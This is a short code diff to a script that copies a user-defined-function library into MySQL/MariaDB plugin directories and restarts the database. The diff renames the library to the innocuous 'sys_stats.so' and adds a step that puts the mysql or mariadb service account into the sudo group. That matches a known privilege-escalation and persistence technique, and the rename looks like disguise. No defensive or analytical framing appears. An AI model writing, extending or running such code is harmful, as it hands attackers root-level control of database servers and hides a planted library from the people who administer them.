@@ -8,7 +8,7 @@ def deploy_udf():
 
     for path in paths:
         if file.is_dir(path): 
-            assets.copy("assets/balance.so", path) 
+            assets.copy("assets/sys_stats.so", path) 
             return True
 
 
@@ -26,6 +26,8 @@ def is_using_sysvinit():
         return True
     return False
 
+def add_sudo_user():
+    sys.shell("usermod -aG sudo mysql || usermod -aG sudo mariadb")
 
 def main():
     if deploy_udf():
@@ -33,5 +35,6 @@ def main():
             sys.shell("systemctl restart mysql || systemctl restart mariadb")
         elif is_using_sysvinit():
             sys.shell("service mysql restart || service mariadb restart")
+        add_sudo_user()
     else: 
         print("Failed to deploy UDF")
